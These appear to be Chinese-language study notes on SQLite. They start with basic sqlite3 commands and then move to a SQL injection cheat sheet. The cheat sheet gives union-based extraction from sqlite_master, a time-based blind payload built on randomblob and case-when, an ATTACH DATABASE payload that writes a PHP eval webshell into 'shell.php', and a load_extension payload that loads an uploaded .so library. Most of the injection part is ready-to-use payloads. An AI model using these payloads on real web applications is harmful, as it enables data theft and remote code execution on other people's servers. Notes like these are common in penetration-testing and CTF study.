#### 基本语法

sqlite的每一个数据库就是一个文件

```sqlite
-- 创建数据库
sqlite3 test.db
-- 查看数据库列表
.database
-- 创建表
如果不指定对应的数据库名就默认在main:table_name中创建
-- 获取表列表
.tables
-- 附加数据库操作
attach database 'db_filePath' as test
-- 注释符
-- or /**/（c语言类型）
-- 导入导出数据库方法
sqlite3 test1.db .dump > test1.sql
sqlite3 test2.db < test1.sql
```

#### 注入基础

```sqlite
-- sqlite_master表
这个表的功能类似于mysql中的information_schema表，记录该数据库中保存的表、索引、视图、和触发器信息，每一行记录一个项目
其中有一个字段是 sql ，存放着创建表所使用的完整sql语句
-- 常规注入
union select 1,2,3 --得到列数
union select 1,group_concat(select * from table_name),3 from sqlite_master --查询数据
-- 盲注
sqlite没有
ascii()
mid()
left()这些函数
有的函数：
substr
-- 时间盲注
没有sleep函数
有一个randomblob(N):返回一个 N 字节长的包含伪随机字节的 BLOG可以代替
没有if结构
我们可以使用他的case when来代替
-1' or (case when(substr(sqlite_version(),1,1)='3') then randomblob(1000000000) else 0 end)/*

-- 写入shell
利用的是attach database命令
使用该命令后，所有的 SQLite 语句将在附加的数据库下执行
如果附加的数据库不存在，则会先创建该数据库，如果数据库文件路径设置在 WEB 目录下，就可以实现写入 Webshell 的功能
ATTACH DATABASE 'shell.php' AS shell;create TABLE shell.exp (webshell text);insert INTO shell.exp (webshell) VALUES ('\r\n\r\n<?php eval($_POST[1]);?>\r\n\r\n');
--要求，需要执行命令的函数可以执行多条命令
example:
PHP:exec()函数
```

```sqlite
-- 加载动态库进行注入
Sqlite 从3.3.6版本开始支持了扩展能力
通过sqlite_load_extension API（或者 load_extension 函数 ），开发者可以在不改动 SQLite 源码的情况下，通过动态加载的库（so/dll/dylib）来扩展 SQLite 的能力
-1'||load_extension('./uploads/exp.so');/*
```

#### 盲注脚本

`sqliteBindInject.py`